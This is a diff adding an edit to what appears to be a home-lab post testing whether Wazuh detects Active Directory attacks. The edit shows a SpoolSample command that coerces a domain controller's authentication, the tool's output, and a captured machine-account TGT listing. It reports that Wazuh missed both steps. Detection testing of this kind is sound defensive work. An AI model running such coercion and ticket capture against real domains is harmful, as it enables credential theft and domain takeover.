@@ -123,4 +123,28 @@ Seems the lab is patched for the spoolsample authentication coercion so I didn't
 
 Wazuh didn't detect the attempt.
 
+*Edit*
+*Apparently there is no patch for spoolsample with Microsoft saying it works as designed. My issue was a firewall.*
+
+```
+PS C:\Users\administrator> .\spoolsample dc01 client02
+[+] Converted DLL to shellcode
+[+] Executing RDI
+[+] Calling exported function
+TargetServer: \\dc01, CaptureServer: \\client02
+Attempted printer notification and received an invalid handle. The coerced authentication probably worked!
+```
+
+```
+[*] 1/4/2024 9:12:36 AM UTC - Found new TGT:
+
+  User                  :  DC01$@DOMAIN.LOCAL
+  StartTime             :  1/4/2024 10:55:02 AM
+  EndTime               :  1/4/2024 8:55:02 PM
+  RenewTill             :  1/11/2024 10:55:02 AM
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :
+```
+*Wazuh still didn't detect the successful auth coercion and ticket capture.*
+
 So out of the box, Wazuh doesn't seem fantastic. The rabit hole probably goes deep on configuring and tuning it to be an effective XDR. 
